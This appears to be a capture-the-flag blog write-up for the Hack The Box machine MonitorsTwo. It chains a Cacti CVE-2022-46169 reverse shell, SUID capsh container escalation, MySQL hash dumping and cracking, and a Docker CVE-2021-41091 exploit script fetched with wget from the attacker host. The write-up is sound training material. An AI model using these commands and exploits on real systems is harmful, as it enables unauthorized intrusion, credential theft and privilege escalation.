---
title: HTB - MonitorsTwo
date: 2024-01-24
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, monitorstwo, nmap]
img_path: /assets/htb/fullpwn/monitorsTwo
published: true
image:
    path: machine_info.png
---

## Overview

[MonitorsTwo](https://app.hackthebox.com/machines/MonitorsTwo) is an Easy Difficulty Linux machine showcasing a variety of vulnerabilities and misconfigurations. 

**Initial foothold**:
	Initial enumeration exposes a web application prone to pre-authentication Remote Code Execution (RCE) through a malicious X-Forwarded-For header. Exploiting this vulnerability grants a shell within a Docker container. 
	
**Privilege escalation (1)**:
	A misconfigured capsh binary with the SUID bit set allows for root access inside the container. 
	
**Lateral movement**:
	Uncovering MySQL credentials enables the dumping of a hash, which, once cracked, provides SSH access to the machine.
	
**Privilege escalation (2)**:
	Further enumeration reveals a vulnerable Docker version that permits a low-privileged user to access mounted container filesystems. Leveraging root access within the container, a bash binary with the SUID bit set is copied, resulting in privilege escalation on the host.

## Information gathering

Port-scanning with Nmap:

```bash
sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.211

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Info from Nmap's output:
- `nginx 1.18.0` web server listening, seems a login portal.
- SSH server listening, but we need creds for using it.

## Initial Foothold

Homepage:

![](home.png){: .normal width="65%"}

We have the app's version: `Cacti 1.2.22`, so before doing anything else let's search for known vulnerabilities:

![](cacti_cve.png){: .normal width="60%"}

We have 4/4 references for the same RCE vulnerability: [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)! 

**Vulnerability**:
	The exploit consists of accessing the vulnerable `/remote_agent.php` endpoint, whose authentication can be bypassed due to a weak implementation of the `get_client_addr` function that uses a user-controlled header, namely `X-Forwarded-For` , to authenticate the client. Once that initial check is bypassed, we then trigger the `poll_for_data` function via the `polldata` action, which is vulnerable to command injection via the `$poller_id` parameter that is passed to `proc_open` , a PHP function that executes system commands.

Let's try this [PoC](https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22):

```bash
# setting up a listener
$ nc -lvnp 1337
listening on [any] 1337 ...
```

```bash
# clone the git repo
$ sudo git clone https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22
Cloning into 'CVE-2022-46169-CACTI-1.2.22'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 4 (delta 1), pack-reused 0
Receiving objects: 100% (18/18), 5.07 KiB | 2.53 MiB/s, done.
Resolving deltas: 100% (4/4), done.

$ cd CVE-2022-46169-CACTI-1.2.22/

$ python3 CVE-2022-46169.py -u http://10.10.11.211/ --LHOST=10.10.14.33 --LPORT=1337
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!
```

```bash
# catching the reverse shell
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.33] from (UNKNOWN) [10.10.11.211] 39056
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$
```

That was fast and easy!

## Privilege escalation (1)

After enumerating different directories and files, nothing interesting pops up. The only think to note is that we are within a `docker` container as indicated by the `/.dockerenv` file:

```bash
www-data@50bca5e748b0:/var/www/html$ ls -la /
total 88
drwxr-xr-x   1 root root 4096 Mar 21  2023 .
drwxr-xr-x   1 root root 4096 Mar 21  2023 ..
-rwxr-xr-x   1 root root    0 Mar 21  2023 .dockerenv
drwxr-xr-x   1 root root 4096 Mar 22  2023 bin
```

We can check if there is anything interesting that can be run with elevated privs:

```bash
www-data@50bca5e748b0:/var/www/html$ find / -type f -perm -u=s 2>/dev/null
find / -type f -perm -u=s 2>/dev/null
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/sbin/capsh
/bin/mount
/bin/umount
/bin/su
```

There is the binary `capsh` which stands out. Doing a quick search on [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) we get this:

![](gtfobins.png){: .normal width="60%"}

Let's follow GFTO's guidance:

```bash
www-data@50bca5e748b0:/var/www$ /sbin/capsh --gid=0 --uid=0 --
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

And we got root...but no flag yet as we are still in a containerized shell!

## Lateral movement

When listing the files in the root directory (`/`), we see a script called `entrypoint.sh`:

```bash
ls -l
total 76
drwxr-xr-x   1 root root 4096 Mar 22  2023 bin
drwxr-xr-x   2 root root 4096 Mar 22  2023 boot
drwxr-xr-x   5 root root  340 Jan 25 14:34 dev
-rw-r--r--   1 root root  648 Jan  5  2023 entrypoint.sh
<SNIP>

cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
        set -- apache2-foreground "$@"
fi

exec "$@"
```

We see multiple `mysql` commands executed as `root`. The script also reveals that the username `admin` exists and the password-related field `must_change_password` is on the `user_auth` table. 

Since, we have root, we can dump the `user_auth`'s data and see what else it contains:

```bash
$ mysql --host=db --user=root --password=root cacti -e "SELECT * FROM user_auth"
id      username        password        realm   full_name       email_address   must_change_password    password_change show_tree       show_list       show_preview    graph_settings     login_opts      policy_graphs   policy_trees    policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked  failed_attempts    lastfail        reset_perms
1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb   1       on      on      on      on      on      2 11       1       1       on      -1      -1      -1              0       0       663348655
3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3       1       1       1       1       1               -1      -1-1               0       0       0
4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                  on      on      on      on      1 11       1       1       on      -1      -1              on      0       0       2135691668
```

We got two pair of creds: 
1. `admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC`
2. `marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C` 

Let's try to crack those on our attack host using `john`:

```bash
$ cat hashes
$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C

$ john hashes --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
funkymonkey      (?)
```

Since we got some creds, `marcus:funkymonkey`, we can try to SSH into our target:

```bash
ssh marcus@10.10.11.211
marcus@monitorstwo:~$ cat user.txt
<SNIP>
```

## Privilege escalation (2)

After going through numerous directories and files, we finally find something interesting:

```bash
marcus@monitorstwo:/var$ cat mail/marcus
From: administrator@monitorstwo.htb
To: all@monitorstwo.htb
Subject: Security Bulletin - Three Vulnerabilities to be Aware Of

Dear all,

We would like to bring to your attention three vulnerabilities that have been recently discovered and should be addressed as soon as possible.

CVE-2021-33033: This vulnerability affects the Linux kernel before 5.11.14 and is related to the CIPSO and CALIPSO refcounting for the DOI definitions. Attackers can exploit this use-after-free issue to write arbitrary values. Please update your kernel to version 5.11.14 or later to address this vulnerability.

CVE-2020-25706: This cross-site scripting (XSS) vulnerability affects Cacti 1.2.13 and occurs due to improper escaping of error messages during template import previews in the xml_path field. This could allow an attacker to inject malicious code into the webpage, potentially resulting in the theft of sensitive data or session hijacking. Please upgrade to Cacti version 1.2.14 or later to address this vulnerability.

CVE-2021-41091: This vulnerability affects Moby, an open-source project created by Docker for software containerization. Attackers could exploit this vulnerability by traversing directory contents and executing programs on the data directory with insufficiently restricted permissions. The bug has been fixed in Moby (Docker Engine) version 20.10.9, and users should update to this version as soon as possible. Please note that running containers should be stopped and restarted for the permissions to be fixed.

We encourage you to take the necessary steps to address these vulnerabilities promptly to avoid any potential security breaches. If you have any questions or concerns, please do not hesitate to contact our IT department.

Best regards,

Administrator
CISO
Monitor Two
Security Team
```

Let's check the vulnerabilities one by one. [CVE-2021-33033](https://nvd.nist.gov/vuln/detail/CVE-2021-33033) refers to kernel version before `5.11.14`, so let's see what we have at the moment:

```bash
marcus@monitorstwo:/var$ uname -a
Linux monitorstwo 5.4.0-147-generic #164-Ubuntu SMP Tue Mar 21 14:23:17 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

Although this seems an outdated version, the `5.4` release series is actually the latest one according to the [official documentation](https://wiki.ubuntu.com/FocalFossa/ReleaseNotes):

![](kernel_doc.png)

[CVE-2020-25706](https://nvd.nist.gov/vuln/detail/CVE-2020-25706) is an XSS vulnerability for `Cacti 1.2.13` and the target app's version is `Cacti 1.2.22`. So, we have left with just the last one: [CVE-2021-41091](https://nvd.nist.gov/vuln/detail/CVE-2021-41091), which refers to `docker`'s engine `Moby 20.10.9` version.

Let's check `docker`'s version:

```bash
marcus@monitorstwo:/var$ docker --version
Docker version 20.10.5+dfsg1, build 55c4c88
```

Docker's version is `20.10.5`, thus, we should be able to exploit this vulnerability. After searching for PoCs, we find [this](https://github.com/UncleJ4ck/CVE-2021-41091) one. 

**Vulnerability**:
	Several dirs within `/var/lib/docker`, which are mounted on and utilized by `docker` containers, are accessible by low-privileged users. This implies that if an attacker gains `root` access inside a container, they could create arbitrary `SUID` files that an unprivileged user outside the container could interact with and use for privilege escalation.

So what we need to is:
1. Repeat our initial foothold process by using CVE-2022-46169 to gain RCE and privesc via the `capsh` binary.
2. Issue the appropriate permissions to the `bash` binary with the `chmod u+s /bin/bash` command.
3. Clone CVE-2021-41091's PoC on our attack host, transfer the bash script (`exp.sh`) on the target using `marcus` account via the SSH, and execute it using the `marcus` user.


1. Repeat our foothold and gain root within the container:

  ```bash
  # gaining root access within the container
  whoami
  root
  id
  uid=0(root) gid=0(root) groups=0(root),33(www-data)
  # assigning suid permission to the bash binary
  chmod u+s /bin/bash
  ```

2. From our attack host:

	```bash
	# clone the repo on the attack host
	$ sudo git clone https://github.com/UncleJ4ck/CVE-2021-41091
	[sudo] password for kali:
	Cloning into 'CVE-2021-41091'...
	remote: Enumerating objects: 25, done.
	remote: Counting objects: 100% (25/25), done.
	remote: Compressing objects: 100% (23/23), done.
	remote: Total 25 (delta 6), reused 3 (delta 0), pack-reused 0
	Receiving objects: 100% (25/25), 6.95 KiB | 6.96 MiB/s, done.
	Resolving deltas: 100% (6/6), done.
	# move within the directory
	$ cd CVE-2021-41091/
	# checking permissions
	$ ls -l
	total 8
	-rwxr-xr-x 1 root root 2446 Jan 25 18:18 exp.sh
	-rw-r--r-- 1 root root 2616 Jan 25 18:18 README.md
	# start a Python HTTP server
	$ python3 -m http.server
	Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
	10.10.11.211 - - [25/Jan/2024 18:19:47] "GET /exp.sh HTTP/1.1" 200 -
	```

3. From `marcus`'s terminal:

  ```bash
  # download the script
  marcus@monitorstwo:~$ wget http://10.10.14.33:8000/exp.sh
  --2024-01-25 18:19:47--  http://10.10.14.33:8000/exp.sh
  Connecting to 10.10.14.33:8000... connected.
  HTTP request sent, awaiting response... 200 OK
  Length: 2446 (2.4K) [text/x-sh]
  Saving to: ‘exp.sh’

  exp.sh                100%[========================>]   2.39K  --.-KB/s    in 0s

  2024-01-25 18:19:47 (356 MB/s) - ‘exp.sh’ saved [2446/2446]
  # assign execute permissions
  marcus@monitorstwo:~$ chmod +x exp.sh
  # confirm permissions
  marcus@monitorstwo:~$ ls -l exp.sh
  total 8
  -rwxrwxr-x 1 marcus marcus 2446 Jan 25 18:18 exp.sh
  # execute the script
  marcus@monitorstwo:~$ ./exp.sh
  [!] Vulnerable to CVE-2021-41091
  [!] Now connect to your Docker container that is accessible and obtain root access !
  [>] After gaining root access execute this command (chmod u+s /bin/bash)

  Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
  [!] Available Overlay2 Filesystems:
  /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
  /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

  [!] Iterating over the available Overlay2 filesystems !
  [?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
  [x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

  [?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  [!] Rooted !
  [>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  [?] If it didnt spawn a shell go to this path and execute './bin/bash -p'

  [!] Spawning Shell
  bash-5.1# exit

  # change to the above mentioned 'Current Vulnerable Path'
  marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
  # execute the command './bin/bash -p'
  marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
  bash-5.1# id
  uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
  bash-5.1# cat /root/root.txt
  <SNIP>
  ```

![](machine_pwned.png){: width="75%" .normal}